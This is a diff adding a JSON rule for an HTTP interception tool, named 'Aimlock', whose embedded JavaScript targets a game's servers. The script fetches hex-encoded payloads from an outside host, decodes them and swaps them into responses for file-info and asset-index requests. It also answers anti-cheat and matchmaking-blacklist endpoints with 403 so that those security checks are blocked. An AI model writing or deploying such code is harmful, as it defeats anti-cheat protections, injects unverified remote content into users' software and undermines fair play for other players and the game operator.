@@ -1,0 +1,13 @@
+
+    {
+        "enabled": true,
+        "name": "Aimlock",
+        "url": [
+            "*/fileinfo*",
+            "*/assetindexer*",
+            "*/ABHotUpdates/*",
+            "*/CheckHackBehavior*",
+            "*/GetMatchmakingBlacklist*"
+        ],
+        "script": "function htb(e) {\n    let t = \"\";\n    const n = e.replace(/\\s/g, \"\");\n    for (let r = 0; r < n.length; r += 2) t += String.fromCharCode(parseInt(n.substr(r, 2), 16));\n    return t\n}\n\nasync function onRequest(e, t) {\n    return t\n}\n\nasync function onResponse(e, t, n) {\n    const r = t.url;\n    const myHost = \"https://garlic.io.vn/api-get.php?id=\";\n    let targetId = \"\";\n\n    if (r.includes(\"fileinfo\")) {\n        targetId = \"fileinfo\";\n    } else if (r.includes(\"assetindexer\")) {\n        targetId = \"assetindexer\";\n    } else if (r.includes(\"login\")) {\n        targetId = \"login\";\n    }\n\n    if (targetId !== \"\") {\n        try {\n            const res = await fetch(myHost + targetId);\n            const myHex = await res.text();\n            \n            if (myHex.length > 10 && !myHex.includes(\"Error\")) {\n                n.body = htb(myHex);\n                n.statusCode = 200;\n                n.headers[\"Content-Type\"] = \"application/octet-stream\";\n                delete n.headers[\"Content-Length\"];\n                console.log(\"Injected \" + targetId + \" successfully\");\n                return n;\n            } else {\n                console.log(\"PHP Server returned: \" + myHex);\n            }\n        } catch (err) {\n            console.log(\"Fetch error: \" + err);\n        }\n    }\n\n    if (r.includes(\"ABHotUpdates\") || r.includes(\"CheckHackBehavior\") || r.includes(\"GetMatchmakingBlacklist\")) {\n        n.statusCode = 403;\n        console.log(\"Blocked Security Check: \" + r);\n        return n;\n    }\n\n    return n;\n}"
+    }
